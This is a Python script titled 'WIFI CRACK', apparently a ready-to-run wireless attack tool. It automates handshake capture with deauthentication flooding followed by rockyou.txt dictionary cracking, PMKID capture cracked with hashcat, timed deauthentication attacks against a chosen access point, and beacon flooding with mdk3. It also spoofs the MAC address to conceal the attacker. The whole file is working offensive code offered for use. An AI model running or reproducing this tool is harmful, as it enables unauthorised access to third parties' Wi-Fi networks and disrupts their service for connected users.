from colorama import Fore
import sys
import os
import subprocess
import time
import signal
import pyfiglet


def ctrl_c(signum, frame):
    get_colours("\n[!] Stopping attack...", "mangeta")
    get_colours("\n\n[!] Clearing Temporary files..", "red")
    get_colours("\n[*] Setting Network interface to it normal mode..", "mangeta")
    subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
    get_colours("\n[*] Network set to it's normal mode...", "yellow")
    os.system("rm -rf Cap*")
    time.sleep(2)
    get_colours("\n[*] Exiting the program...", "blue")
    print(Fore.WHITE)  # To avoid leaving the terminal with colors.
    exit(1)


signal.signal(signal.SIGINT, ctrl_c)


# Script Banner
def script_banner():
    script_name = pyfiglet.figlet_format("WIFI \n~ CRACK", font="slant")
    owner_name = 'By: Gurpreet ~ Singh (Gurpreet06)'
    owner = f"""
    \t┌─────────────────────────────────────────┐
    \t│                                         │          
    \t│ {Fore.BLUE + owner_name}       │     
    \t│                                         │  
    \t└─────────────────────────────────────────┘
    """

    print('\n', Fore.YELLOW + script_name, end="")
    print(owner)


# Colours
def get_colours(text, color):
    if color == "green":
        green_color = Fore.GREEN + text
        print(green_color)
    elif color == "red":
        red_color = Fore.RED + text
        print(red_color)
    elif color == "blue":
        blue_color = Fore.BLUE + text
        print(blue_color)
    elif color == "yellow":
        yellow_color = Fore.YELLOW + text
        print(yellow_color)
    elif color == "magenta":
        magenta_color = Fore.MAGENTA + text
        print(magenta_color)
    elif color == "cyan":
        cyan_color = Fore.CYAN + text
        print(cyan_color)


def menu_panel():
    get_colours(f"\n[{Fore.RED + '!'}{Fore.GREEN + ''}] Usage: sudo python3 " + sys.argv[0] + " -n <Network InterFace> "
                "-a <parameters>", "green")
    get_colours("――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――", 'red')
    print(f"\n{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-n]'}{Fore.YELLOW + ' Interface in monitor mode'}")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-a]'}{Fore.YELLOW + ' Attack mode'}")
    print("")
    get_colours(f"\t Handshake", "blue")
    get_colours(f"\t PKMID", "blue")
    get_colours(f"\t DAuth (Deauthentication attack)", "blue")
    get_colours(f"\t BFlood (Beacon flooding attack)", "blue")
    print("")
    print(f"{Fore.BLUE + '┃'}  {Fore.MAGENTA + '[-h]'}{Fore.YELLOW + ' Help Panel'}")
    print(Fore.WHITE)  # To avoid leaving the terminal with colors.


def check_deps():
    subprocess.run(["clear"])
    script_banner()
    program_status = False
    get_colours("\n\n[*] Checking necessary programs...", "blue")
    # Check MDK3
    check_mdk3 = subprocess.run(["which", "mdk3"], capture_output=True, text=True)
    if "/usr/bin/mdk3" in check_mdk3.stdout or "/usr/sbin/mdk3" in check_mdk3.stdout:
        get_colours(f"\nMDK3\t\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nMDK3 \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [MDK3]....", "cyan")
        install_mdk3 = subprocess.run(["sudo", "apt", "install", "mdk3", "-y"], capture_output=True,
                                            text=True)
        if "Setting up mdk3" in install_mdk3.stdout:
            get_colours("\n[*] MDK3 Installed...", "blue")
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install mdk3'}")
            print(Fore.WHITE)
            exit()
    # Check Mac-Changer
    check_macchanger = subprocess.run(["which", "macchanger"], capture_output=True, text=True)
    if "/usr/bin/macchanger" in check_macchanger.stdout or "/usr/sbin/macchanger" in check_macchanger.stdout:
        get_colours(f"\nMacchanger\t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nMacchanger \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [Macchanger]....", "cyan")
        install_macchanger = subprocess.run(["sudo", "apt", "install", "macchanger", "-y"], capture_output=True,
                                            text=True)
        if "Setting up macchanger" in install_macchanger.stdout:
            get_colours("\n[*] Macchanger Installed...", "blue")
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install macchanger'}")
            print(Fore.WHITE)
            exit()
    # Check Airmon-Ng
    check_airmon_ng = subprocess.run(["which", "airmon-ng"], capture_output=True, text=True)
    if "/usr/bin/airmon-ng" in check_airmon_ng.stdout or "/usr/sbin/airmon-ng" in check_airmon_ng.stdout:
        get_colours(f"\nAirmon-ng \t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nAirmon-ng \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [Airmon-ng]....", "cyan")
        install_airmon_ng = subprocess.run(["sudo", "apt", "install", "airmon-ng", "-y"], capture_output=True,
                                           text=True)
        if "Setting up airmon-ng" in install_airmon_ng.stdout:
            get_colours("\n[*] Airmon-ng Installed...", "blue")
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install airmon-ng'}")
            print(Fore.WHITE)
            exit()
    # Check hcxdumptool
    check_hcxdumptool = subprocess.run(["which", "hcxdumptool"], capture_output=True, text=True)
    if "/usr/bin/hcxdumptool" in check_hcxdumptool.stdout or "/usr/sbin/hcxdumptool" in check_hcxdumptool.stdout:
        get_colours(f"\nhcxdumpTool \t\t ({Fore.BLUE + 'V'}{Fore.MAGENTA + ')'}", "magenta")
    else:
        get_colours(f"\nhcxdumpTool \t\t ({Fore.RED + 'X'}{Fore.MAGENTA + ')'}", "magenta")
        get_colours("\nInstalling [hcxdumpTool]....", "cyan")
        install_hcxdump = subprocess.run(["sudo", "apt", "install", "hcxdumptool", "-y"], capture_output=True,
                                         text=True)
        subprocess.run(["sudo", "apt", "install", "hcxtools"], stdout=subprocess.DEVNULL)
        if "Setting up hcxdumptool" in install_hcxdump.stdout:
            get_colours("\n[*] hcxdumpTool Installed...", "blue")
        else:
            get_colours(f"\n[!] There was an error installing the necessary program, Please install the following"
                        f" programs manually: ", 'red')
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hcxdumptool'}")
            print(f"\n{Fore.BLUE + '┃'}  {Fore.YELLOW + ' sudo apt install hcxtools'}")
            print(Fore.WHITE)
            exit()
    time.sleep(2)
    attack_func(sys.argv[2], sys.argv[4])  # If all the necessary programs are installed then call the attack func.
    print(Fore.WHITE)


def attack_func(network_interface, attack_mode):
    time.sleep(1)
    subprocess.run(["clear"])
    get_colours("\n[*] Setting up network card...", "yellow")
    os.system(f"sudo ifconfig {network_interface} down")  # To Avoid channel problems.
    os.system(f"sudo ifconfig {network_interface} down")
    time.sleep(2)
    subprocess.run(["sudo", "airmon-ng", "start", network_interface], stdout=subprocess.DEVNULL)
    get_colours("\n[!] Generating new Mac Address...", "cyan")
    time.sleep(3)
    subprocess.run(["sudo", "ifconfig", network_interface + "mon", "down"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "macchanger", "-r", network_interface + "mon"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "ifconfig", network_interface + "mon", "up"], stdout=subprocess.DEVNULL)

    get_colours("\n[*] New Mac Address Generated ", "blue")
    time.sleep(1)
    subprocess.run(["clear"])
    # HandShake Attack Mode
    if attack_mode == "Handshake":
        script_banner()
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
        # os.system(f"xterm -hold -e sudo airodump-ng {network_interface}mon &")
        access_name = input(Fore.YELLOW + "Access point name: ")
        access_channel = input(Fore.YELLOW + "Channel name: ")
        time.sleep(1)
        get_colours("\n[*] Setting up things...", 'cyan')
        try:
            process.wait(timeout=2)  # Time for the process
        except subprocess.TimeoutExpired:
            process.kill()
        get_current_path = subprocess.check_output('pwd').strip()
        set_path = f'{get_current_path.decode()}/Capture'
        get_colours("\n[*] Waiting for the Handshake", 'cyan')
        os.system(
            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} -w {set_path} {network_interface}mon &")
        time.sleep(5)
        os.system(f"xterm -hold -e aireplay-ng -0 40 -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
        time.sleep(2)
        subprocess.run(["clear"])
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
        out, err = process1.communicate()
        timer_total = 70
        timer_process = range(timer_total, 9, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        os.system('clear')
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        timer_process = range(9, 0, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + '0' + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        # time.sleep(65)
        for line in out.splitlines():
            if b'xterm' in line:
                pid = int(line.split(None, 1)[0])
                os.kill(pid, signal.SIGKILL)
        subprocess.run(["clear"])
        get_colours("\n[*] Clearing processes", 'red')
        time.sleep(2)
        os.system(f"xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt {set_path}-01.cap &")
        os.system('clear')
        quit_program()
    # PKMID Attack Mode
    elif attack_mode == "PKMID":
        subprocess.run(["clear"])
        script_banner()
        time.sleep(1)
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        get_colours("\n[*] Starting the PKMID Client-Less ATTACK", "magenta")
        time.sleep(3)
        get_colours(f"\n[*] Time Left: \t\t{Fore.YELLOW + str(100)} Seconds", 'blue')
        get_colours("", "yellow")
        process = subprocess.Popen(
            ["sudo", "hcxdumptool", "-i" + network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
        try:
            process.wait(timeout=100)  # Time for the process
        except subprocess.TimeoutExpired:
            get_colours(f"\n[!] Timed out - killing process ID -  {Fore.BLUE + str(process.pid)}", 'red')
            process.kill()
        time.sleep(2)
        subprocess.run(["clear"])
        get_colours("\n[!] Clearing Temporary files..", "red")
        print(Fore.WHITE)
        time.sleep(3)
        get_colours("", "yellow")
        subprocess.run(["clear"])
        get_pkmid_hashes = subprocess.run(["sudo hcxpcaptool -z myHashes_PKMID Capture_PKMID"],
                                          capture_output=True, text=True, shell=True)
        time.sleep(2)
        get_colours("\n[*] Trying getting hashes", "magenta")
        # subprocess.run(["rm", "Capture_PKMID"])
        time.sleep(2)
        if "PMKID(s) written to myHashes" in get_pkmid_hashes.stdout:
            get_colours("\nStarting with Brute-Force attack..", "cyan")
            time.sleep(3)
            get_colours("", "yellow")
            subprocess.run(["sudo", "hashcat", "-m", "16800", "-a", "0", "-w", "4", "myHashes_PKMID",
                            "/usr/share/wordlists/rockyou.txt", "-d", "1", "--force"])
        else:
            os.system('clear')
            get_colours("\n[-] no packet captured...", "red")
            time.sleep(2)
            os.system("rm -rf Cap*")
            os.system('clear')
            quit_program()
    # Deauthentication Attack Mode
    elif attack_mode == "DAuth":
        script_banner()
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        process = subprocess.Popen(["xterm", "-hold", "-e", "sudo", "airodump-ng", f"{network_interface}mon"])
        access_name = input(Fore.YELLOW + "Access point name: ")
        access_channel = input(Fore.YELLOW + "Channel name: ")
        attack_time = input(Fore.YELLOW + "Time for the attack (seconds): ")
        time.sleep(1)
        get_colours("\n[*] Setting up things...", 'cyan')
        try:
            process.wait(timeout=2)  # Time for the process
        except subprocess.TimeoutExpired:
            process.kill()
        os.system(
            f"xterm -hold -e sudo airodump-ng -c {access_channel} --essid {access_name} {network_interface}mon &")
        os.system(
            f"xterm -hold -e aireplay-ng -0 {int(attack_time) * 200} -e {access_name} -c FF:FF:FF:FF:FF:FF {network_interface}mon &")
        subprocess.run(["clear"])
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        process1 = subprocess.Popen(['ps', '-A'], stdout=subprocess.PIPE)
        out, err = process1.communicate()
        timer_total = int(attack_time)
        timer_process = range(timer_total, 9, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        os.system('clear')
        get_colours("\n[*] Sending deauthentication packets to victim router\n\n", 'cyan')
        timer_process = range(9, 0, -1)
        for i in timer_process:
            get_colours(f"[*] Time Left: \t\t{Fore.YELLOW + '0' + str(i)}", 'blue')
            sys.stdout.write("\033[F")
            time.sleep(1)
        # time.sleep(65)
        for line in out.splitlines():
            if b'xterm' in line:
                pid = int(line.split(None, 1)[0])
                os.kill(pid, signal.SIGKILL)
        get_colours("\n\n\n[*] Attack completed successfully", 'green')
        quit_program()
    # Beacon Flood Attack Mode
    elif attack_mode == "BFlood":
        subprocess.run(["sudo", "airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        os.system('clear')
        script_banner()
        get_colours("[*] Starting the attack...", 'blue')
        get_colours("\n[!] Don't close the windows otherwise the attack will stop.", 'yellow')
        get_colours("\n[!] Press CTRL+C to stop the attack.", "red")
        os.system(
            f"xterm -hold -e sudo mdk3 {network_interface}mon b -a -g -s 1000")
        quit_program()


def quit_program():
    time.sleep(2)
    get_colours("\n[!] Exiting the program...", "blue")
    get_colours("\nSetting Network interface to it normal mode..", "mangeta")
    subprocess.run(["sudo", "airmon-ng", "stop", sys.argv[2] + "mon"], stdout=subprocess.DEVNULL)
    subprocess.run(["sudo", "service", "NetworkManager", "restart"], stdout=subprocess.DEVNULL)
    get_colours("\n[*] Network set to it's normal mode...", "magenta")
    print(Fore.WHITE)
    exit(0)


def check_parms():
    if len(sys.argv) > 1:
        if sys.argv[1] == "-h":
            menu_panel()
        elif len(sys.argv) > 2:
            if len(sys.argv) > 3:
                if len(sys.argv) > 4:
                    check_interface_exist = subprocess.run(["ip", "a"], capture_output=True, text=True)
                    check_attack_mode = ["Handshake", "PKMID", "DAuth", "BFlood"]
                    if sys.argv[2] not in check_interface_exist.stdout:
                        get_colours("\n[!] Invalid Network Interface name (Ej: wlan0 / eth0)", "red")
                        print(Fore.WHITE)
                    elif sys.argv[4] not in check_attack_mode:
                        get_colours("\n[!] Select a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
                        print(Fore.WHITE)
                    else:
                        check_deps()  # Check for necessary program to run this script.
                else:
                    get_colours("\n[!] Select a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
                    print(Fore.WHITE)
            else:
                get_colours("\n[!] Select a valid attack Mode (Handshake / PKMID / DAuth / BFlood)", "red")
                print(Fore.WHITE)
        else:
            get_colours("\n[!] Select a valid Interface (wlan0 / eth0)", "red")
            print(Fore.WHITE)
    else:
        menu_panel()


check_parms()
